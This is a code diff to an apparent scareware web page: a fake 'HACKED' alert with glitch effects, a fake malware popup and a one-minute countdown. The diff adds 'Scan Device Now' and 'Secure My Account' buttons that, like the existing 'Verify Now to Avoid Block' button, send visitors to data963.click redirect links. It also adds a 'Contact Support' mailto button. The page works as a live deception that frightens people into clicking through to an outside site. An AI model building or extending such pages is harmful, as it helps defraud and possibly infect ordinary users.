@@ -20,7 +20,6 @@
       justify-content: center;
       align-items: center;
     }
-    /* HACKED Text Background */
     .hacked-bg {
       position: fixed;
       inset: 0;
@@ -49,7 +48,6 @@
       letter-spacing: 0.15em;
       filter: blur(0.6px) contrast(1.08);
     }
-
     @keyframes hacked-blink {
       0%, 100% { opacity: 0.16; }
       45% { opacity: 0.42; }
@@ -73,8 +71,6 @@
       80% { transform: translateY(2px) skewX(-2deg); }
       85% { transform: none; }
     }
-
-    /* GLITCH LINES */
     .glitch-lines {
       position: fixed;
       width: 100vw;
@@ -106,8 +102,6 @@
       0% { left: 100vw;}
       100% { left: -100vw;}
     }
-
-    /* Box di atas background */
     .box {
       background: rgba(255, 255, 255, 0.92);
       padding: 25px;
@@ -183,6 +177,10 @@
       box-shadow: 0 4px 10px rgba(0,0,0,0.15);
       display: none;
       transition: opacity 0.3s ease;
+      margin-bottom: 12px;
+    }
+    button:last-of-type {
+      margin-bottom: 0;
     }
     button:hover {
       background: #0b5ed7;
@@ -253,8 +251,18 @@
       <div class="progress-bar" id="progress"></div>
     </div>
     <div class="countdown" id="countdown">01:00</div>
+    <!-- CTA Buttons -->
     <button id="verifyBtn" onclick="window.location.href='https://data963.click/85627ae6ea1982f6863a/00e523e89f/?placementName=US'">
       🛡️ Verify Now to Avoid Block
+    </button>
+    <button id="scanBtn" onclick="window.location.href='https://data963.click/31f241f72db4ed29b757/ea92949de5/?placementName=default'">
+      🔍 Scan Device Now
+    </button>
+    <button id="secureBtn" onclick="window.location.href='https://data963.click/85627ae6ea1982f6863a/00e523e89f/?placementName=US'">
+      🔒 Secure My Account
+    </button>
+    <button id="helpBtn" onclick="window.location.href='mailto:support@example.com'">
+      💬 Contact Support
     </button>
     <div class="device-info" id="deviceInfo">Detecting device info...</div>
     <div class="footer">* Secure mobile session – verification will expire</div>
@@ -292,9 +300,18 @@
     let time = 60;
     const countdown = document.getElementById('countdown');
     const button = document.getElementById('verifyBtn');
+    const scanBtn = document.getElementById('scanBtn');
+    const secureBtn = document.getElementById('secureBtn');
+    const helpBtn = document.getElementById('helpBtn');
     const deviceInfo = document.getElementById('deviceInfo');
     const fakeAlert = document.getElementById('fakeAlert');
     const scanSound = document.getElementById('scanSound');
+
+    // Hide CTA buttons initially
+    button.style.display = 'none';
+    scanBtn.style.display = 'none';
+    secureBtn.style.display = 'none';
+    helpBtn.style.display = 'none';
 
     // Countdown 60 seconds
     const timer = setInterval(() => {
@@ -308,10 +325,13 @@
       }
     }, 1000);
 
-    // Show verify button after progress bar animation (6s)
+    // Show CTA buttons after progress bar animation (6s)
     const progressBar = document.getElementById('progress');
     progressBar.addEventListener('animationend', () => {
       button.style.display = 'block';
+      scanBtn.style.display = 'block';
+      secureBtn.style.display = 'block';
+      helpBtn.style.display = 'block';
     });
 
     // Show malware popup after 4s, hide after 6s more
